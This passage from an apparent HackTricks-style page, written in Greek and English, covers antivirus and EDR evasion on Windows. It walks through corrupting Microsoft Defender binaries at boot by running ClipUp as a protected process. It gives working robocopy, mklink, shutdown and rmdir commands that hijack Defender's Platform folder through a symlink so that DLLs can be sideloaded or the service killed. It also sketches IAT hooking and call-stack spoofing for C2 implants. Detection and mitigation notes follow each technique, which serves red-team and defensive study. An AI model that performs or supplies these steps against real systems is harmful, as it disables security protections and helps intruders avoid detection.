2) Πέρασε το ClipUp log-path όρισμα για να αναγκάσεις τη δημιουργία αρχείου σε έναν προστατευμένο AV directory (π.χ. Defender Platform). Χρησιμοποίησε 8.3 short names αν χρειάζεται.
3) Αν το target binary είναι συνήθως ανοιχτό/κλειδωμένο από το AV ενώ τρέχει (π.χ. MsMpEng.exe), προγραμμάτισε την εγγραφή στο boot πριν ξεκινήσει το AV εγκαθιστώντας μια auto-start service που τρέχει αξιόπιστα νωρίτερα. Επικύρωσε το boot ordering με Process Monitor (boot logging).
4) Μετά το reboot η PPL-backed εγγραφή γίνεται πριν το AV κλειδώσει τα binaries του, διαφθείροντας το target file και αποτρέποντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp πέρα από την τοποθέτηση· το primitive είναι κατάλληλο για αλλοίωση παρά για ακριβή εισαγωγή περιεχομένου.
- Απαιτεί local admin/SYSTEM για εγκατάσταση/εκκίνηση υπηρεσίας και παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει κλειδώματα αρχείων.

Ανιχνεύσεις
- Δημιουργία διεργασίας του `ClipUp.exe` με ασυνήθη επιχειρήματα, ειδικά με parent από μη-τυπικούς launchers, γύρω από την εκκίνηση.
- Νέες υπηρεσίες διαμορφωμένες να auto-start ύποπτα binaries και που ξεκινούν συστηματικά πριν το Defender/AV. Διερευνήστε τη δημιουργία/τροποποίηση υπηρεσίας πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων σε Defender binaries/Platform directories· απροσδόκητες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- ETW/EDR τηλεμετρία: ψάξτε για διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδου PPL από non-AV binaries.

Αντιμετώπιση
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να τρέξουν ως PPL και υπό ποιους γονείς· μπλοκάρετε την εκκίνηση του ClipUp εκτός νόμιμων πλαισίων.
- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start υπηρεσιών και παρακολουθήστε παραποιήσεις της σειράς εκκίνησης.
- Βεβαιωθείτε ότι το Defender tamper protection και οι early-launch protections είναι ενεργοποιημένα· διερευνήστε σφάλματα εκκίνησης που υποδεικνύουν διαφθορά binary.
- Σκεφτείτε να απενεργοποιήσετε τη δημιουργία συντομων ονομάτων 8.3 σε volumes που φιλοξενούν εργαλεία ασφαλείας εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

Αναφορές για PPL και εργαλεία
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Προϋποθέσεις
- Local Administrator (needed to create directories/symlinks under the Platform folder)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Γιατί λειτουργεί
- Το Defender μπλοκάρει εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις εγγραφές καταλόγου και επιλέγει τη λεξικογραφικά υψηλότερη έκδοση χωρίς να επαληθεύει ότι ο στόχος επιλύεται σε προστατευμένο/έμπιστο path.

Βήμα-βήμα (παράδειγμα)
1) Ετοιμάστε ένα εγγράψιμο clone του τρέχοντος φακέλου πλατφόρμας, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε έναν symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform που δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (reboot recommended):
```cmd
shutdown /r /t 0
```
4) Επιβεβαιώστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε το νέο μονοπάτι διαδικασίας κάτω από `C:\TMP\AV\` και τη διαμόρφωση υπηρεσίας/μητρώου που αντανακλά αυτή τη θέση.

Επιλογές post-exploitation
- DLL sideloading/code execution: Τοποθετήστε/αντικαταστήστε DLLs που φορτώνει ο Defender από τον κατάλογο εφαρμογής του για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την ενότητα παραπάνω: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Αφαιρέστε το version-symlink ώστε στην επόμενη εκκίνηση το διαμορφωμένο μονοπάτι να μην επιλύεται και ο Defender να αποτύχει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει privilege escalation από μόνη της· απαιτεί admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι Red teams μπορούν να μεταφέρουν τη runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module κάνοντας hook στο Import Address Table (IAT) και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position‑independent code (PIC). Αυτό γενικεύει την evasion πέρα από τη μικρή επιφάνεια API που πολλά kits εκθέτουν (π.χ., CreateProcessA), και επεκτείνει τις ίδιες προστασίες σε BOFs και post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Operational integration
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Detection/DFIR considerations
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
